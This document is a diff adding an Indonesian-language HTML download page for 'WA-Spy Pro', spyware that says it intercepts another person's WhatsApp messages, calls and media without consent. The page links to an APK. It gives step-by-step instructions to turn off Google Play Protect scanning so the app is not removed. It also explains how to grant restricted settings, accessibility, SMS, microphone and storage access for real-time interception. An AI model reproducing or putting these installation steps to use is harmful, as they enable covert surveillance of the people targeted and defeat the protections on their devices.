@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Tracker WA - Peringatan Keamanan</title>
+    <style>
+        :root {
+            --primary: #128c7e;
+            --dark: #111827;
+            --light: #f3f4f6;
+            --danger: #dc2626;
+            --warning: #f59e0b;
+        }
+
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0f172a;
+            color: #e2e8f0;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+
+        /* Banner Peringatan Ilegal */
+        .illegal-banner {
+            background-color: var(--danger);
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+
+        header {
+            background-color: var(--primary);
+            color: white;
+            padding: 1.5rem 5%;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 700px;
+            margin: 2rem auto;
+            padding: 0 20px;
+        }
+
+        .app-card {
+            background: #1e293b;
+            border-radius: 20px;
+            padding: 2.5rem;
+            text-align: center;
+            border: 1px solid #334155;
+        }
+
+        .app-icon {
+            width: 90px;
+            height: 90px;
+            background: #25d366;
+            border-radius: 20px;
+            margin: 0 auto 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.5rem;
+            box-shadow: 0 0 20px rgba(37, 211, 102, 0.4);
+        }
+
+        .illegal-tag {
+            background: rgba(220, 38, 38, 0.2);
+            color: #f87171;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            border: 1px solid #ef4444;
+            display: inline-block;
+            margin-bottom: 1rem;
+        }
+
+        .btn-download {
+            background-color: var(--danger);
+            color: white;
+            padding: 18px 45px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 800;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+        }
+
+        .btn-download:hover {
+            background-color: #b91c1c;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(220, 38, 38, 0.4);
+        }
+
+        .guide-section {
+            margin-top: 2rem;
+            background: #1e293b;
+            padding: 1.5rem;
+            border-radius: 15px;
+            border-left: 4px solid var(--warning);
+        }
+
+        h3 { color: var(--warning); margin-bottom: 15px; }
+
+        .step-box {
+            background: #334155;
+            padding: 12px 18px;
+            margin: 8px 0;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            border-left: 3px solid #64748b;
+        }
+
+        .restricted-note {
+            color: #fbbf24;
+            font-size: 0.85rem;
+            margin-top: 10px;
+            font-style: italic;
+        }
+
+        footer {
+            text-align: center;
+            padding: 3rem;
+            font-size: 0.75rem;
+            color: #94a3b8;
+        }
+    </style>
+</head>
+<body>
+
+<div class="illegal-banner">
+    ⚠️ PERINGATAN: APLIKASI INI ILEGAL & MELANGGAR PRIVASI (SADAP WHATSAPP) ⚠️
+</div>
+
+<header>
+    <h1>WA-Spy Pro Installer</h1>
+</header>
+
+<div class="container">
+    <div class="app-card">
+        <div class="illegal-tag">Ilegal </div>
+        <div class="app-icon">🕵️</div>
+        <h2>WA-Spy Tracker v4.1</h2>
+        <p style="color: #94a3b8;">Aplikasi ini dirancang untuk menyadap pesan, panggilan, dan media WhatsApp tanpa izin pemilik akun.</p>
+        <a href="wa-spy.apk" class="btn-download" onclick="confirmDownload()">UNDUH APK ILEGAL</a>
+    </div>
+
+    <div class="guide-section">
+        <h3>🛡️ Google Play Protect</h3>
+        <p>Agar aplikasi penyadap tidak dihapus otomatis oleh sistem Android:</p>
+        <div class="step-box">1. Buka <strong>Play Store</strong>.</div>
+        <div class="step-box">2. Klik Profil > <strong>Play Protect</strong>.</div>
+        <div class="step-box">3. Klik ikon <strong>Gear/Setelan</strong> di pojok kanan atas.</div>
+        <div class="step-box">4. Matikan <strong>"Pindai aplikasi dengan Play Protect"</strong>.</div>
+    </div>
+
+    <div class="guide-section">
+        <h3>⚙️ Aktivasi Izin Aksesibilitas (Full Access)</h3>
+        <p>Untuk menyadap pesan secara *real-time*, izinkan semua akses berikut:</p>
+        <div class="step-box">1. Buka <strong>Pengaturan</strong> Android > <strong>Aplikasi</strong>.</div>
+        <div class="step-box">2. Cari "WA-Spy Pro" > Ketuk <strong>Titik Tiga</strong> di kanan atas.</div>
+        <div class="step-box">3. Pilih <strong>"Izinkan pengaturan terbatas"</strong> (Allow restricted settings).</div>
+        <div class="step-box">4. Masuk ke <strong>Aksesibilitas</strong> > Pilih WA-Spy > Aktifkan <strong>ON</strong>.</div>
+        <div class="step-box">5. Berikan izin: Kontak, SMS, Mikrofon, dan Penyimpanan.</div>
+        <p class="restricted-note">*Langkah 2-3 wajib dilakukan pada Android 13/14 agar fitur sadap berjalan otomatis.</p>
+    </div>
+</div>
+
+<footer>
+    Penyalahgunaan aplikasi ini sepenuhnya tanggung jawab pengguna. <br>
+    &copy; 2026 BlackHat Distribution.
+</footer>
+
+<script>
+    function confirmDownload() {
+        const check = confirm("PERINGATAN: Aplikasi ini bersifat ilegal dan dapat membahayakan privasi orang lain. Lanjutkan unduhan?");
+        if(check) {
+            alert("Memulai unduhan file APK...");
+        }
+    }
+</script>
+
+</body>
+</html>
